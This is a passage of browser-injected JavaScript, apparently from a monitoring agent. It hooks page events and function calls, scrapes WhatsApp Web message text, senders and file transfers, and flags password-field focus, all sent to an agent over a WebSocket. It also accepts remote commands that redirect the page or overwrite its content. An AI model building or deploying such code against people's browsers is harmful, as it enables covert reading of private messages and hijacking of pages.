/*       * here we scan all provided settings and choose what listeners are required       * we don't want to intrude in the js more that necessary for performance and compatibility considerations       */      attachEvents: function () {          var needClick = false, needChange = false, needChildList = this.sendLogSnapshots, needCharacterData = this.sendLogSnapshots, callObjects = [];          this.pages.forEach(function (page) {              page.objects.forEach(function (obj) {                  ['addText', 'removeText', 'addElm', 'removeElm', 'stateByElm'].forEach(function (source) {                      if (obj.sources.includes(source))                          needChildList = true;                  });                  if (obj.sources.includes('changeText'))                      needCharacterData = true;                  if (obj.sources.includes('change'))                      needChange = true;                  if (obj.sources.includes('click'))                      needClick = true;                  if (obj.sources.includes('call'))                      callObjects.push({ page: page, obj: obj });              });          });          this.log("attachEvents: needClick:" + needClick + " needChange:" + needChange + " needChildList:" + needChildList + " needCharacterData:" + needCharacterData);          if (needClick)              window.addEventListener('click', this.onEvent.bind(this), true);          if (needChange)              window.addEventListener('change', this.onEvent.bind(this), true);          if (needChildList || needCharacterData)              new MutationObserver(this.onMutation.bind(this)).observe(document, { subtree: true, childList: needChildList, characterData: needCharacterData });            if (needClick || needChange || needChildList || needCharacterData) {              /* we process mutation events only after human interaction */              window.addEventListener('keydown', this.onInteraction.bind(this));              window.addEventListener('mousedown', this.onInteraction.bind(this));          }            if (callObjects.length > 0) {              var self = this;              var intervalHandle = setInterval(function () {                  for (var i = callObjects.length - 1; i >= 0; i--) {                      if (self.interceptCall(callObjects[i]))                          callObjects.splice(i, 1);                  }                  if (callObjects.length == 0)                      clearInterval(intervalHandle);              }, 500);          }      },        interceptCall: function (callObj) {          var obj = callObj.obj, jsObj;          try {              jsObj = this.calc(obj, "object", [], []);          }          catch{ }          if (jsObj == null) {              this.log("attachEvents: object:" + obj.id + " is not found");              return false;          }          var method = jsObj[obj.func];          var self = this;          jsObj[obj.func] = function () {              var arg_data = self.calc(obj, "arg_data", ["args"], [arguments], "return null");              var ret = method.apply(jsObj, arguments);              var return_data = self.calc(obj, "return_data", ["ret"], [ret], "return null");              if (arg_data != null || return_data != null)                  self.sendEvent("interceptCall", callObj.page, obj, undefined, { arg_data: arg_data, return_data: return_data });              return ret;          };          self.log("attachEvents: object:" + obj.id + ", " + (obj.object || obj.object_f) + " is found, call to '" + obj.func + "' intercepted");          return true;      },        /* new Date().getTime() of the last human interacion (keydown, mousedown, mouseup)      to filter out DOM mutation events that was not due to human activity */      lastInteraction: null,        /* on human interaction (keydown, mousedown, mouseup) */      onInteraction: function (ev) {          this.lastInteraction = new Date().getTime();          this.log('onInteraction: human Interaction ' + ev.type + ': ' + this.lastInteraction);      },        /* handles click and change events */      onEvent: function (ev) {          var self = this;          this.callSafe("onEvent", function () {              self.handleEvent(ev.type, ev.type, ev.composed ? ev.composedPath() : self.getAncestors(ev.target));          });      },        /* handles addText, changeText, removeText, addElm, removeElm DOM mutation events */      onMutation: function (mList) {          var self = this;          if (this.sendLogSnapshots)              this.log("snapshot: " + document.body.outerHTML.replace(/\n|\r/g, '#'));          this.callSafe("onMutation", function () {              if (self.lastInteraction !== null) {                  mList.forEach(function (m) {                      if (m.type === 'childList') {                          m.removedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'removeText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'removeElm', self.getAncestors(m.target), sub);                          });                          m.addedNodes.forEach(function (sub) {                              if (sub.nodeType === Node.TEXT_NODE)                                  self.handleEvent('change', 'addText', self.getAncestors(m.target));                              else if (sub.nodeType === Node.ELEMENT_NODE)                                  self.handleEventWithSub('change', 'addElm', self.getAncestors(m.target), sub);                          });                      }                      else if (m.type === 'characterData' && m.target)                          self.handleEvent('change', 'changeText', self.getAncestors(m.target));                  });              }                self.processStateByElm();          });      },        objId2key2value: {},      processStateByElm: function () {          var self = this;          self.forEachObject('stateByElm', function (page, obj) {              var key2value = {};              if (self.calc(obj, 'condition', [], [], "return true;")) {                  self.applySelector(document, obj.selector).forEach(function (elm) {                      var key = self.calc(obj, 'key', ['e'], [elm]);                      var value = self.calc(obj, 'value', ['e'], [elm]);                      key2value[JSON.stringify(key)] = JSON.stringify(value);                  });              }                var oldKey2Value = self.objId2key2value[obj.id];              oldKey2Value = oldKey2Value ? oldKey2Value : {};              for (var k in key2value) {                  if (key2value[k] !== oldKey2Value[k])                      self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined, "new": JSON.parse(key2value[k]) });                  delete oldKey2Value[k];              }              for (var k in oldKey2Value)                  self.sendEvent('change', page, obj, undefined, { key: JSON.parse(k), old: oldKey2Value[k] ? JSON.parse(oldKey2Value[k]) : undefined });              self.objId2key2value[obj.id] = key2value;          });      },        /* get ancestors for the element */      getAncestors: function (e) {          var path = [];          for (; e !== document && e !== null; e = e.parentNode)              path.push(e);          return path;      },        /* handles simple events: click, change, addText, changeText, removeText */      handleEvent: function (type, source, ancestors) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEvent: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              self.send(type, page, obj, ancestors[0], elm);          });      },        /* handles events with sub element: addElm, removeElm */      handleEventWithSub: function (type, source, ancestors, sub) {          if (this.sendLog)    /* double check not to call elementString in vain */              this.log("handleEventWithSub: type:" + type + " source:" + source + " target:" + this.elementString(ancestors[0]) + " sub:" + this.elementString(sub));          var self = this;          this.forEachMatch(source, ancestors, function (page, obj, elm) {              if (!obj.sub_matches || sub.matches(obj.sub_matches)) {                  if (obj.sub_selector) {                      self.applySelector(sub, obj.sub_selector).forEach(function (descendant) {                          self.send(type, page, obj, ancestors[0], elm, sub, descendant);                      });                  }                  else {                      self.send(type, page, obj, ancestors[0], elm, sub);                  }              }          });      },        /* enumerate all obj based on url and source. calls handler(page, obj) */      forEachObject: function (source, handler) {          var self = this;          this.pages.forEach(function (page) {              if (self.testRegex(page.url, document.URL)) {                  page.objects.forEach(function (obj) {                      if (obj.sources.includes(source))                          handler(page, obj);                  });              }          });      },        /* enumerate all matches based on url, source and interactionInterval, matches and selector. calls handler(page, obj, matchedElm) */      forEachMatch: function (source, ancestors, handler) {          var self = this;          this.forEachObject(source, function (page, obj) {              if (obj.interactionInterval && (self.lastInteraction == null || new Date().getTime() - self.lastInteraction > obj.interactionInterval)) {                  if (self.lastInteraction != null)                      self.log('forEachMatch skip rule: interval:' + (new Date().getTime() - self.lastInteraction).toString());              }              else {                  var scope = obj.scope === 'target' ? [ancestors[0]] : ancestors,                      m = obj.matches,                      set = !m && obj.selector ? self.applySelector(document, obj.selector) : null;                  for (var i = 0; i < scope.length; ++i) {                      if ((m && scope[i].matches && scope[i].matches(m)) /* scope[i] may not be element, test if matches is defined */                          || (set && set.includes(scope[i]))) {                          handler(page, obj, scope[i]);                          break;                      }                  }              }          });      },        /* return array of elements after applying commands from the selector settings */      applySelector: function (root, commands) {          const self = this;          var elms = [root];          commands.forEach(function (command) {              var res = [];              elms.forEach(function (elm) {                  if (command.test_text) {    /* test_text command keeps only elements whose text matches regex */                      if (self.testRegex(command.test_text, elm.textContent))                          res.push(elm);                  }                  else if (command.move) {    /* move command transforms element into querySelectorAll set and select shadowRoot if present */                      elm.querySelectorAll(':scope ' + command.move).forEach(function (e) {                          var s = e.shadowRoot;                          res.push(s ? s : e);                      });                  }                  else if (command.exists) {  /* exists command keeps only elements for which selector set is not empty */                      if (self.applySelector(elm, command.exists).length !== 0)                          res.push(elm);                  }              });              elms = res;          });          return elms;      },        /* send event data to websocket, data structure:       * {       *      cat: 'insight' - this is required to route the message to the proper handler       *      type: click | changed - type of the event       *      elm: uint32 - id of the element that fired the event. used for deduplication of the events       *      page: uint32 - id of the hypermonitored location       *      obj: uint32 - id of the hypermonitored object that fired event       *      url: string - current document url       *      token: string - js injection token, used to unique identify browser page       *      values: json - contains all collected information about event and it's context       * }       */      lastSentElm: null,      lastSentElmId: 0,      send: function (type, page, obj, target, e, sub, descendant) {          if (this.lastSentElm !== e) {              this.lastSentElm = e;              this.lastSentElmId++;          }          const values = this.calc(obj, 'values', ['target', 'e', 'sub', 'descendant'], [target, e, sub, descendant]);          if (values)              this.sendEvent(type, page, obj, this.lastSentElmId.toString(), values);      },        sendEvent: function (type, page, obj, elmId, values) {          const t = JSON.stringify({              values: values,              handler: page.handler,              type: type,              elm: elmId,              page: page.id,              obj: obj.id,              url: document.URL,              token: this.token,              proc: this.proc          });          if (this.sendLog)              console.log("[InsightJs] send: " + t);          this.processPacket(t);      },        /* utils: cache compiled regexes */      string2regex: {},      testRegex: function (stringRegex, value) {          if (stringRegex === null)              return true;          if (!(stringRegex in this.string2regex))              this.string2regex[stringRegex] = new RegExp(stringRegex);          return this.string2regex[stringRegex].test(value);      },        /* utils: cache compiled functions */      code2function: {},      calc: function (host, prop, names, args, defaultCode) {          var code = host[prop] ? "return " + host[prop] + ";" : host[prop + "_f"];          if (code == null)              code = defaultCode;          if (code == null) {              this.log("code not found, calc(" + JSON.stringify(host) + "), prop:" + prop);              return {};          }          if (!(code in this.code2function))              this.code2function[code] = new Function(...names, code);          return this.code2function[code].apply(null, args);      },        /* utils: dump html element to the log */      elementString: function (e) {          var html = e.nodeType == Node.TEXT_NODE ? e.data : e.outerHTML;          if (this.sendLogFullData)              return html;          html = html.length > 100 ? html.substr(0, 100) + " ... total len:" + html.length : html;          return html.replace(/\n|\r/g, '#');      },        /* log to console and to the agent */      log: function (message, force) {          if (this.sendLog || force) {              var m = new Date().toLocaleString() + ": " + message;              console.log("[InsightJs] " + m + ", url:" + document.URL);              this.processPacket(JSON.stringify({ handler: "log", module: "InsightJs", message: m, url: document.URL }));          }      },        callSafe: function (name, f) {          if (!this.sendLogExceptions)              f();          else {              try {                  f()              }              catch (e) {                  this.log("exception in " + name + ":" + e.name + ", " + e.message, true);              }          }      }  }},L=6e4,I=null,T=null,k=null,C=null,O=!1,H=null,P=null,R=0,x=null,B=null,F="",J=!1;!function e(t){m()?setTimeout((function(){e(t)}),1e3):t()}((function(){w.extJs&&w.extJs.init(w.token),n()&&(window.addEventListener("focus",r,!0),w.dontTrackWebPasswords&&window.addEventListener("message",E,!1)),n()||w.extJs?p():w.dontTrackWebPasswords&&f()}))}();</script><script>!function(){var e,t,Y;function n(){try{return window.self===window.top}catch(e){return!1}}function r(){setTimeout((function(){var e={type:"focus",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:w.pid,pn:w.pn};null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))}),0)}function a(){var e={type:"notification",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:w.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:w.pid,pn:w.pn};B.send(JSON.stringify(e))}function s(){y()}function i(){n()&&(clearInterval(I),clearInterval(T)),timeout=setTimeout((function(){g()}),L)}function o(e){if(n())switch(e.data.substring(0,1)){case"r":window.location=e.data.substring(1);break;case"b":document.body.innerHTML=e.data.substring(1);break;case"w":var t="true"==e.data.substring(1).toLowerCase();O!=t&&t&&v(),O=t;break;case"x":!function(e){try{const t=JSON.parse(e),Y=b.get(t.requestId);if(Y){b.delete(t.requestId);const{responseCallback:e,fileName:n}=Y;e(t,n)}}catch(e){unblockPage()}}(e.data.substring(1))}}function u(e){var t=document.createElement("a");return t.href=e,t.href}function d(e){if(!e)return!1;if("password"==e.type)return!0;if(e instanceof HTMLInputElement){var t=window.getComputedStyle(e);if(t){var Y=t.getPropertyValue("-webkit-text-security");return["disc","circle","square"].includes(Y)}}return!1}function c(e,t=!1){if(d(e)&&!J)if(J=!0,n()){var Y={type:"password_input_focus",focus:!0,token:w.token};B.send(JSON.stringify(Y))}else window.top.postMessage({message:"iframePasswordInputFocused",name:e.name,type:"password"},"*")}function M(e,t=!1){var Y=e&&e.name?e.name:"<unnamed>";if(d(e)&&J)if(J=!1,n()){var r={type:"password_input_focus",focus:!1,token:w.token};B.send(JSON.stringify(r))}else window.top.postMessage({message:"iframePasswordInputBlurred",name:Y,type:"password"},"*")}function l(e){var t=document.activeElement;t&&t!=document.body?document.querySelector&&(t=document.querySelector(":focus")):t=null;for(var Y=0;Y<e.length;++Y){let s=e[Y];var n=d(s),r=n&&s.hasAttribute("autofocus"),a=n&&t&&s.isEqualNode(t);(r||a)&&c(s),s.tmInputEventListenerAttached||(s.addEventListener("focus",(function(e){c(e.target)}),!0),s.addEventListener("blur",(function(e){M(e.target)}),!0),s.tmInputEventListenerAttached=!0)}}function f(){l(document.getElementsByTagName("input"));var e=new MutationObserver((function(e){e&&e.forEach((function(e){e&&e.addedNodes&&0!=e.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),e.addedNodes.forEach((function(e){if(e.tagName){var t=[];"input"==e.tagName.toLowerCase()?t.push(e):t=e.getElementsByTagName("input"),t.length&&l(t)}})))}))}));e.observe(document,{childList:!0,subtree:!0}),window.addEventListener("beforeunload",(function(e){M(),function(){for(var e=document.getElementsByTagName("input"),t=0;t<e.length;++t){let Y=e[t];Y.removeEventListener("focus",c),Y.removeEventListener("blur",M),delete Y.tmInputEventListenerAttached}}()}))}function D(){var e;n()&&(w.iup&&(e={type:"connect",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:w.pid,pn:w.pn},null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))),h()&&(v(),y(),function(){function e(e){return e.baseURI&&e.baseURI.startsWith("https://web.whatsapp.com/")}function t(e){const t=e.dataTransfer.files;t.length>0&&Array.from(t).forEach((e=>{N(e)}))}document.querySelectorAll("div").forEach((Y=>{e(Y)&&Y.addEventListener("drop",t,{passive:!0})}));var Y=new MutationObserver((function(e){e&&(Array.from(document.querySelectorAll(".message-in, .message-out")).reduce(((e,t)=>{var Y=t.querySelector("button[type=button], div[role=button]");return Y&&e.push(Y),e}),[]).forEach((e=>{const t="modified";e.hasAttribute(t)||(e.setAttribute(t,""),e.onclick=t=>{t.verified||(t.preventDefault(),t.stopPropagation(),new Promise((function(t,Y){!function(e,t,Y){try{const Y=e.parentElement,n=Y[Object.keys(Y).find((e=>e.includes("__reactProps")))].children.props.msg,r=n.mediaData,a=crypto.randomUUID();b.set(a,{responseCallback:e=>t(!e.block)}),B.send(JSON.stringify({requestId:a,type:"waptransfer",direction:"download",filename:r.__x_filename,filesize:r.__x_size,filetype:r.__x_mimetype,filehash:n.__x_encFilehash,url:document.URL,process:w.pn,content:""}))}catch{Y()}}(e,t,(()=>setTimeout((()=>Y()),1)))})).then((e=>{t.verified=e,t.verified&&t.target.dispatchEvent(t)}),(()=>{})))})})),e.forEach((function(e){e&&("childList"!==e.type||e.addedNodes.length<=0||e.addedNodes.forEach((function(e){if(e){e.querySelectorAll("input").forEach((e=>{!function(e){const t="modified";"file"!==e.type||e.hasAttribute(t)||(e.setAttribute(t,""),e.addEventListener("change",(e=>{Array.from(e.target.files).forEach((e=>{N(e)}))})))}(e)}));var t=document.querySelectorAll("div[id=main] header div")[2];if(t){var Y=t.querySelectorAll("div")[1],n=t.querySelectorAll("div")[2];k=(Y?Y.innerText:"")+":"+(n?n.innerText:"")}document.querySelector("div[id=main] header span[data-icon=default-user]")&&(C="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(C="group");var r=e.querySelectorAll(".message-in, .message-out");r||A("msgNodes is empty"),e.matches(".message-in, .message-out")&&(r=Array.prototype.slice.call(r)).push(e),r&&0!=r.length?r.forEach((function(e){if(e)if(!e.classList||e.classList.length<=0)A("msg node does not contain classList or classList is empty");else{var t=e.classList.contains("message-in"),Y=e.querySelector(".copyable-text"),n=e.querySelector(".selectable-text"),r=new Date,a=null;if(Y&&Y.attributes["data-pre-plain-text"]){var s=Y.attributes["data-pre-plain-text"].textContent,i=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]\.?\s?m\.?)?,\s(.+)]\s(.*):/i[Symbol.match](s);if(!i||6!=i.length)return void A("no matches for string: "+s);if(i[3]&&i[3].length>1&&"p"==i[3].toLowerCase().slice(0,1)&&(i[1]=parseInt(i[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](i[4]),!dateParts||4!=dateParts.length)return void A("no matches for string: "+i[4]);if(A(i[4]+F),!(r=date.parse(i[4],F)||function(e,t,Y){var n=[[e,t,Y].join("-"),[e,Y,t].join("-"),[t,e,Y].join("-"),[t,Y,e].join("-"),[Y,e,t].join("-"),[Y,t,e].join("-")],r=Date.now();for(var a in n){var s=Date.parse(n[a]);if(s&&!(Math.abs(r-s)>1728e6))return new Date(s)}}(dateParts[1],dateParts[2],dateParts[3])))return void A("Can't parse date from string: "+i[4]);r.setHours(i[1]),r.setMinutes(i[2]),a=i[5]}A("isIncomingMsg = "+t+" msgDateTime = "+r+" msgSender = "+a+" wapStartTime = "+x+" wapTrackingEnabled = "+O),H.get(k)||H.set(k,x);var o=n?n.innerText:null;if(A("msgContent = "+o),a&&o&&O){var u=(a+o+k+r.getTime()).split("").map((function(e){return e.charCodeAt(0)})).reduce((function(e,t){return e+((e<<7)+(e<<3))^t})).toString(16);if(H.get(k).getTime()==r.getTime()?r.setMilliseconds(++R):(R=0,H.set(k,r)),!u||P.has(u))return void A("msgId is null or this msgId already tracked "+u);var d={type:"wapmessage",timestamp:r.getTime(),id:u,incoming:t,sender:t?a:"Me",content:o,recipient:t?"Me":k,conversationId:k+"("+C+")"};B.send(JSON.stringify(d)),P.add(u)}}})):A("no msg nodes found")}})))})))}));if(!Y)return;Y.observe(document.body,{childList:!0,subtree:!0}),A("observer is ready")}()),n()&&(a(),I=setInterval(a,w.sendNotificationsInterval),h()&&(T=setInterval(s,w.pollWhatsappTrackingInterval))),function(){for(var e=[],t=document.getElementsByTagName("link"),Y=0;Y<t.length;++Y)"icon"!=t[Y].getAttribute("rel")&&"shortcut icon"!=t[Y].getAttribute("rel")||(e[e.length]=u(t[Y].getAttribute("href")));0==e.length&&(e[0]=u("/favicon.ico"));var n={type:"favicon"};n.url=document.URL,n.src=e,n.title=document.title,n.token=w.token,n.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,B.send(JSON.stringify(n))}(),w.dontTrackWebPasswords&&f())}function p(){document.tmfilter||(g(),F={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function g(){(B=new WebSocket(w.connectionString)).onclose=i,B.onmessage=o,B.onopen=D,w.extJs&&(w.extJs.webSock={readyState:()=>B.readyState,send:e=>B.send(e)})}function m(){var e=function(){var e=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var t=0;t<e.length;t++)if(e[t]+"Hidden"in document)return e[t]+"Hidden";return null}();return!!e&&document[e]}function h(){var e=document.head.querySelector("[name='og:title']");return!!e&&"WhatsApp Web"===e.getAttribute("content")}function y(){B.send(JSON.stringify({type:"waptracking"}))}function v(){H=new Map,P=new Set,R=0,(x=new Date).setSeconds(0),x.setMilliseconds(0)}function S(e){for(var t="",Y=new Uint8Array(e),n=Y.byteLength,r=0;r<n;r++)t+=String.fromCharCode(Y[r]);return window.btoa(t)}e=this,t={},Y={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(e){return("000"+e.getFullYear()).slice(-4)},YY:function(e){return("0"+e.getFullYear()).slice(-2)},Y:function(e){return""+e.getFullYear()},MMMM:function(e){return this.MMMM[e.getMonth()]},MMM:function(e){return this.MMM[e.getMonth()]},MM:function(e){return("0"+(e.getMonth()+1)).slice(-2)},M:function(e){return""+(e.getMonth()+1)},DD:function(e){return("0"+e.getDate()).slice(-2)},D:function(e){return""+e.getDate()},HH:function(e){return("0"+e.getHours()).slice(-2)},H:function(e){return""+e.getHours()},A:function(e){return this.A[11<e.getHours()|0]},hh:function(e){return("0"+(e.getHours()%12||12)).slice(-2)},h:function(e){return""+(e.getHours()%12||12)},mm:function(e){return("0"+e.getMinutes()).slice(-2)},m:function(e){return""+e.getMinutes()},ss:function(e){return("0"+e.getSeconds()).slice(-2)},s:function(e){return""+e.getSeconds()},SSS:function(e){return("00"+e.getMilliseconds()).slice(-3)},SS:function(e){return("0"+(e.getMilliseconds()/10|0)).slice(-2)},S:function(e){return""+(e.getMilliseconds()/100|0)},dddd:function(e){return this.dddd[e.getDay()]},ddd:function(e){return this.ddd[e.getDay()]},dd:function(e){return this.dd[e.getDay()]},Z:function(e){return(0<(e=e.utc?0:e.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(e-e%100*.4)).slice(-4)},post:function(e){return e}},parser:{find:function(e,t){for(var Y,n=-1,r=0,a=0,s=e.length;a<s;a++)Y=e[a],!t.indexOf(Y)&&Y.length>r&&(n=a,r=Y.length);return{index:n,length:r}},MMMM:function(e){return this.parser.find(this.MMMM,e)},MMM:function(e){return this.parser.find(this.MMM,e)},A:function(e){return this.parser.find(this.A,e)},h:function(e,t){return(12===e?0:e)+12*t},pre:function(e){return e}}}},t.format=function(e,n,r){var a=t.addMinutes(e,r?e.getTimezoneOffset():0),s=Y.en,i=s.formatter;return a.utc=r,n.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,(function(e){var t=i[e];return t?i.post(t.call(s,a,n)):e.replace(/\[(.*)]/,"$1")}))},t.parse=function(e,n,r){var a,s,i=Y.en,o=i.parser.pre(e),u=0,d=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,c={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};e=[31,28,31,30,31,30,31,31,30,31,30,31];for(var M={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=d.exec(n);){var l=0,f=1;for(s="";!s;)s=a[++l];a=s.charAt(0);var D=o.slice(u);if(2>l){var p=i.parser[s].call(i,D,n);M[a]=p.index,"M"===a&&M[a]++,f=p.length}else if(7>l)p=(D.match(c[l])||[""])[0],M[a]=0|("S"===a?(p+"000").slice(0,-s.length):p),f=p.length;else if(" "!==a&&a!==D[0])return NaN;if(!f)return NaN;u+=f}return u===o.length&&p?(M.Y+=70>M.Y?2e3:100>M.Y?1900:0,M.H=M.H||i.parser.h(M.h||0,M.A||0),n=new 